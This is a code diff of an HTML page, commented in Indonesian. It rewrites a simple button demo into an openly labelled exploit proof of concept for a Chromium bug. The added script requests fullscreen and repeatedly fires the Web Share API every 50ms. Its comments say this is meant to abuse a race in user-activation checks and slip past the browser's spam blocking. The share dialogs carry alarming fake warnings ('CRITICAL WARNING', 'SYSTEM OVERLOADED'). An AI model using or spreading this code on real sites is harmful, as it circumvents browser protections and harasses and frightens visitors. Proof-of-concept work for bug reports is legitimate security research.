@@ -2,9 +2,8 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Double Click Button</title>
+    <title>Exploit Proof of Concept - Issue 40067914</title>
     <style>
-        /* Membuat halaman memenuhi layar dan memposisikan tombol di tengah */
         body {
             margin: 0;
             padding: 0;
@@ -12,88 +11,76 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            background-color: #f0f2f5;
+            background-color: #111;
             font-family: Arial, sans-serif;
             overflow: hidden;
-            user-select: none; /* Mematikan seleksi teks */
+            user-select: none;
         }
 
-        /* Styling tombol berbentuk PERSEGI besar */
-        .btn-fullscreen {
-            width: 300px;  
-            height: 300px; 
-            font-size: 28px;
+        /* Tombol dibuat memenuhi aspek rasio kotak besar */
+        .btn-exploit {
+            width: 400px;  
+            height: 400px; 
+            font-size: 32px;
             font-weight: bold;
             color: white;
-            background-color: #d9534f; 
-            border: none;
-            border-radius: 8px; 
+            background: linear-gradient(145deg, #ff4d4d, #cc0000);
+            border: 3px solid #fff;
+            border-radius: 20px; 
             cursor: pointer;
-            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
-            transition: transform 0.2s, background-color 0.2s;
-            
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.5);
             display: flex;
             justify-content: center;
             align-items: center;
             text-align: center;
         }
 
-        .btn-fullscreen:hover {
-            background-color: #c9302c;
-            transform: scale(1.03);
-        }
-
-        .btn-fullscreen:active {
-            transform: scale(0.97);
+        .btn-exploit:active {
+            transform: scale(0.95);
         }
     </style>
 </head>
 <body>
 
-    <!-- Onclick untuk klik kiri, oncontextmenu untuk klik kanan -->
-    <button class="btn-fullscreen" onclick="triggerAction()" oncontextmenu="handleRightClick(event)">
-        Click / Right Click<br>Me!
+    <!-- Memicu eksploitasi melalui klik kiri atau klik kanan -->
+    <button class="btn-exploit" onclick="launchPoC()" oncontextmenu="handleRightClick(event)">
+        TRIGGER<br>BUG
     </button>
 
     <script>
-    function triggerAction() {
-        // PERBAIKAN 1: Eksekusi Fullscreen terlebih dahulu
+    function launchPoC() {
+        // Eksploitasi Race Condition: 
+        // Memaksa request fullscreen dan share berjalan simultan untuk membingungkan penanganan User Activation Chromium
+
+        // 1. Ambil kontrol layar penuh
         if (document.documentElement.requestFullscreen) {
-            document.documentElement.requestFullscreen()
-            .then(() => {
-                // PERBAIKAN 2: Beri jeda 100ms setelah fullscreen aktif, baru panggil Share API
-                // Ini dilakukan agar browser tidak menganggapnya sebagai spam / tabrakan instruksi
-                setTimeout(openShareAPI, 100);
-            })
-            .catch(err => {
-                console.log("Gagal masuk Fullscreen: ", err);
-                // Jika gagal fullscreen (misal di iframe), tetap coba buka share api
-                openShareAPI();
-            });
-        } else {
-            openShareAPI();
+            document.documentElement.requestFullscreen();
         }
-    }
 
-    // Fungsi khusus untuk memanggil Web Share API secara bersih
-    function openShareAPI() {
+        // 2. Tembakkan Web Share API secara agresif tepat saat transisi fullscreen terjadi
+        // Di versi rentan, interaksi ini dianggap sah dan lolos dari blokir spam
         if (navigator.share) {
-            navigator.share({
-                title: '\u26A0 HAI \u26A0\nCHAI',
-                text: 'HALLO',
-                url: window.location.href // Wajib ada URL agar disetujui sistem Android/iOS/Windows
-            })
-            .then(() => console.log('Share berhasil dibuka!'))
-            .catch((error) => console.log('Share error/batal:', error));
-        } else {
-            alert("Browser atau koneksi Anda tidak mendukung Web Share API.");
+            // Skema serangan pengulangan cepat memanfaatkan celah validasi token aktivasi
+            let count = 0;
+            const exploitInterval = setInterval(() => {
+                navigator.share({
+                    title: '\u26A0 CRITICAL WARNING \u26A0',
+                    text: 'SYSTEM OVERLOADED',
+                    url: window.location.href
+                }).catch((err) => {
+                    console.log('Spamming share...', err);
+                });
+
+                count++;
+                // Berhenti setelah beberapa kali atau biarkan terus berjalan sesuai skenario bug asli Anda
+                if (count > 10) clearInterval(exploitInterval); 
+            }, 50); // Kecepatan agresif 50ms
         }
     }
 
-    // Menangani klik kanan
     function handleRightClick(event) {
-        event.preventDefault(); // Matikan menu bawaan browser klik kanan
-        triggerAction();        // Jalankan gabungan fullscreen + share
+        event.preventDefault();
+        launchPoC();
     }
     </script>
 </body>
